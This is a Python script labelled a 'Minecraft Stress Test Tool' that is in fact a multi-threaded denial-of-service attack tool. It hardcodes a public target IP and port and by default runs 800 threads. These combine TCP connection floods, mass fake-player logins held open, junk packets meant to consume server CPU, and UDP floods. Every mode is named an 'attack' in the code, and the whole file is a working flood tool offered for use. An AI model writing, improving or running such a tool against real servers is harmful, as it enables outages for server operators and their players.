"""
Minecraft Stress Test Tool - Threaded Edition
"""
import socket, time, struct, hashlib, string, random, sys, threading
from colorama import init, Fore
init(autoreset=True)

TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
MODE = "combined"
THREADS = 800
DURATION = 300

def cprint(m, c=Fore.WHITE):
    print(f"{c}{m}{Fore.RESET}")

rnd_name = lambda: "Bot_" + "".join(random.choices(string.ascii_letters + string.digits, k=6))
rnd_bytes = lambda s: random.randbytes(s)

# cache
_vc = {}
def vi(v):
    if v in _vc: return _vc[v]
    o = b''
    while True:
        b = v & 0x7F
        v >>= 7
        if v: o += bytes([b | 0x80])
        else: o += bytes([b]); break
    _vc[0] = o
    return o

def ps(s):
    e = s.encode('utf-8')
    return vi(len(e)) + e

_hc = {}
_src = None

def hpk(ip, port, ns):
    k = (ip, port, ns)
    if k in _hc: return _hc[k]
    h = vi(0x00) + vi(767) + ps(ip) + struct.pack('>H', port) + vi(ns)
    p = vi(len(h)) + h
    _hc[k] = p
    return p

def srp():
    global _src
    if _src: return _src
    r = vi(0x00)
    p = vi(len(r)) + r
    _src = p
    return p

def lsp(u):
    d = "OfflinePlayer:" + u
    dig = bytearray(hashlib.md5(d.encode()).digest())
    dig[6] = dig[6] & 0x0f | 0x30
    dig[8] = dig[8] & 0x3f | 0x80
    ls = vi(0x00) + ps(u) + bytes(dig)
    return vi(len(ls)) + ls

# sync socket helpers
def snd(s, data):
    try: s.sendall(data); return True
    except: return False

def rcv(s, size=4096, timeout=0.5):
    s.settimeout(timeout)
    try: return s.recv(size)
    except: return b''

# THREADED WORKERS

def tcp_connect_worker(ip, port, dur, stop):
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.settimeout(0.5)
            s.connect((ip, port))
            s.close()
        except:
            pass

def tcp_login_worker(ip, port, dur, stop):
    end = time.time() + dur
    held = []
    while time.time() < end and not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(1.0)
            s.connect((ip, port))

            if snd(s, hpk(ip, port, 2)) and snd(s, lsp(rnd_name())):
                held.append(s)
                continue
            s.close()
        except:
            pass

    # keep held connections alive by sending junk
    end2 = time.time() + 30
    for s in held:
        if stop.is_set() or time.time() > end2: break
        try:
            # send invalid packet ids to consume server CPU
            junk = vi(random.randint(0, 127)) + rnd_bytes(random.randint(1, 64))
            snd(s, vi(len(junk)) + junk)
        except:
            pass

    for s in held:
        try: s.close()
        except: pass

def tcp_login_spam_worker(ip, port, dur, stop):
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(0.5)
            s.connect((ip, port))
            snd(s, hpk(ip, port, 2))
            snd(s, lsp(rnd_name()))
            # keep sending junk until close
            for _ in range(5):
                try:
                    junk = vi(random.randint(1, 50)) + rnd_bytes(random.randint(1, 256))
                    s.sendall(vi(len(junk)) + junk)
                except: break
            s.close()
        except:
            pass

def udp_flood_worker(ip, port, dur, stop):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end = time.time() + dur
    # valid minecraft query packet
    query_pkt = b'\xFE\x01'
    while time.time() < end and not stop.is_set():
        try:
            sock.sendto(query_pkt + rnd_bytes(1022), (ip, port))
            sock.sendto(rnd_bytes(1400), (ip, port))
        except:
            try: sock.close()
            except: pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.close()

# COMBINED ATTACK - all methods simultaneously
def combined_attack(ip, port, dur, threads):
    stop = threading.Event()
    all_threads = []

    # 40% login
    n_login = max(1, int(threads * 0.4))
    # 30% login+spam
    n_spam = max(1, int(threads * 0.3))
    # 20% connect flood
    n_conn = max(1, int(threads * 0.2))
    # 10% udp
    n_udp = max(1, int(threads * 0.1))

    cprint(f"[🚀] COMBINED attack -> {ip}:{port}", Fore.CYAN)
    cprint(f"[📊] Login:{n_login} Spam:{n_spam} Connect:{n_conn} UDP:{n_udp} | {dur}s", Fore.CYAN)

    for _ in range(n_login):
        t = threading.Thread(target=tcp_login_worker, args=(ip, port, dur, stop), daemon=True)
        t.start(); all_threads.append(t)

    for _ in range(n_spam):
        t = threading.Thread(target=tcp_login_spam_worker, args=(ip, port, dur, stop), daemon=True)
        t.start(); all_threads.append(t)

    for _ in range(n_conn):
        t = threading.Thread(target=tcp_connect_worker, args=(ip, port, dur, stop), daemon=True)
        t.start(); all_threads.append(t)

    for _ in range(n_udp):
        t = threading.Thread(target=udp_flood_worker, args=(ip, port, dur, stop), daemon=True)
        t.start(); all_threads.append(t)

    start = time.time()
    try:
        while time.time() - start < dur:
            alive = sum(1 for t in all_threads if t.is_alive())
            sys.stdout.write(f"\r[📊] {time.time()-start:.0f}s | Threads: {alive}/{len(all_threads)}")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()

    stop.set()
    for t in all_threads:
        t.join(timeout=2)
    cprint("\n[✅] Done", Fore.GREEN)

def single_attack(ip, port, dur, threads, mode):
    stop = threading.Event()
    fn = {"connect": tcp_connect_worker, "login": tcp_login_worker, "udp": udp_flood_worker}.get(mode, tcp_connect_worker)
    cprint(f"[🚀] {mode.upper()} attack -> {ip}:{port}", Fore.CYAN)
    cprint(f"[📊] Threads: {threads} | {dur}s", Fore.CYAN)
    all_t = [threading.Thread(target=fn, args=(ip, port, dur, stop), daemon=True) for _ in range(threads)]
    for t in all_t: t.start()
    start = time.time()
    try:
        while time.time() - start < dur:
            alive = sum(1 for t in all_t if t.is_alive())
            sys.stdout.write(f"\r[📊] {time.time()-start:.0f}s | Alive: {alive}/{len(all_t)}")
            sys.stdout.flush(); time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()
    stop.set()
    for t in all_t: t.join(timeout=2)
    cprint("\n[✅] Done", Fore.GREEN)

# MAIN
def main():
    cprint("Minecraft Stress Test - Threaded", Fore.YELLOW)

    if len(sys.argv) >= 5:
        ip, port, dur, thr = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
        mode = sys.argv[5] if len(sys.argv) > 5 else MODE
    elif sys.argv[1:2] == ["--menu"]:
        ip = input("IP: ").strip()
        port = int(input("Port: ") or "25565")
        dur = int(input("Duration: ") or "60")
        thr = int(input("Threads: ") or "800")
        mode = input("Mode (combined/connect/login/udp): ") or MODE
    else:
        ip, port, dur, thr = TARGET_IP, TARGET_PORT, DURATION, THREADS
        mode = MODE

    if mode == "combined":
        combined_attack(ip, port, dur, thr)
    else:
        single_attack(ip, port, dur, thr, mode)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Stopped", Fore.YELLOW)
    except Exception as e:
        cprint(f"[❌] {e}", Fore.RED)
